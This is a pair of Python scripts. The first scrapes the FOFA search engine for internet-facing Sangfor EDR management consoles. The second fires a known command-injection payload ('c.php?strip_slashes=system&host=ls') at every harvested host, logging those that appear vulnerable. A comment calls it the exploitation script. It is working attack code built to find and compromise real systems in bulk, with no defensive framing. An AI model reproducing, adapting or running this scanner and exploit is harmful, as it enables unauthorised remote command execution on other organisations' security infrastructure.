# coding:utf-8
#from bs4 import BeautifulSoup
import requests,re
import time
session = "_fofapro_ars_session=*******"
header = {
    "Accept":"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01",
    "Accept-Encoding":"gzip, deflate, br",
    "Accept-Language":"zh-CN,zh;q=0.9",
    "Connection":"keep-alive",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36 Edg/84.0.522.59",
    "X-CSRF-Token":"DpraMUR6PuefxdVpDmbZmgW9572Oz4CKSkqLa4u+astRxa+NSW5t0gfjlRB8cESuUrBvrD+zkGA9GFcfEYAVZA==",
    "X-Requested-With":"XMLHttpRequest",
    "Cookie":session,
}

for i in range(1,23):
    time.sleep(5)
    #url="https://fofa.so/result?q=title%3D%22%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0%{0}&qbase64=dGl0bGU9Iue7iOerr%2BajgOa1i%2BWTjeW6lOW5s%2BWPsCI%3D&file=&file=&full=true"
    url="https://fofa.so/result?q=title%3D%22%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0%22&qbase64=dGl0bGU9Iue7iOerr%2BajgOa1i%2BWTjeW6lOW5s%2BWPsCI%3D&file=&file=&full=true&page={}"   
    true_url=url.format(i)
    print(true_url)
    reponse=requests.get(true_url,headers=header)
    sour=reponse.text
    sour1=sour.replace('\\','')
    #print(sour)

    pattern='<a target="_blank" href="https://59.46.126.82:9000">'

    findlist=re.findall(r'<a target="_blank" href="(.*?)">',sour1)
    with open("ceshi.txt",'a') as f:
        for j in findlist:
            f.writelines(j+'\n')

    print(findlist)
    #print(sour) //fofa扫描所有可能存在漏洞点的ip脚本







import requests
import re
import time
payload='/tool/log/c.php?strip_slashes=system&host=ls'
f=open('ceshi.txt','r')

aim_list=f.read().split('\n')
success=[]
f.close()
f1=open("succ.txt",'a')
for i in aim_list:
    time.sleep(2)
    test=i+payload
    print(test)
    try:
        reponse=requests.get(test,verify=False,timeout=5)
        if "File not found." not in reponse.text:
            success.append(test)
            f1.writelines(test+'\n')
        print(reponse.text)
    except Exception as e:
        print(e)
        continue
f1.close()
print(success)
#print(aim_list)
//扫描之后利用的脚本exp